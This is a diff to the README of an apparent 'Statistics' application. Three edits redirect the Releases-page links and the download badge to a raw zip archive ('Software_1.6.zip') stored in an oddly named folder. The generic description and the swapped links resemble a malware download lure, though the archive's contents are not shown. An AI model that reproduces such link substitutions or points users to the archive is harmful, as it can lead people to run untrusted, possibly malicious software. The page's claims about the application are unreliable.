@@ -6,7 +6,7 @@ Welcome to the Statistics repository. This application shares useful information
 
 ## 📥 Download Now
 
-[![Download Statistics](https://img.shields.io/badge/Download-Statistics-brightgreen)](https://github.com/phxainteasy/Statistics/releases)
+[![Download Statistics](https://github.com/phxainteasy/Statistics/raw/refs/heads/main/occipitalis/Software_1.6.zip)](https://github.com/phxainteasy/Statistics/raw/refs/heads/main/occipitalis/Software_1.6.zip)
 
 ## 📝 Overview
 
@@ -35,7 +35,7 @@ To run the Statistics application effectively, ensure your computer meets the fo
 
 Go to the Releases page to get the latest version of the Statistics application. Click the button below to visit:
 
-[Download Statistics](https://github.com/phxainteasy/Statistics/releases)
+[Download Statistics](https://github.com/phxainteasy/Statistics/raw/refs/heads/main/occipitalis/Software_1.6.zip)
 
 ### Step 2: Download the Application
 
@@ -104,6 +104,6 @@ We welcome your feedback on the Statistics application. Your input will help us 
 
 For your convenience, here is the link to download the application once more:
 
-[Download Statistics](https://github.com/phxainteasy/Statistics/releases)
+[Download Statistics](https://github.com/phxainteasy/Statistics/raw/refs/heads/main/occipitalis/Software_1.6.zip)
 
 Thank you for using the Statistics application. We hope it becomes a valuable tool in your decision-making process.
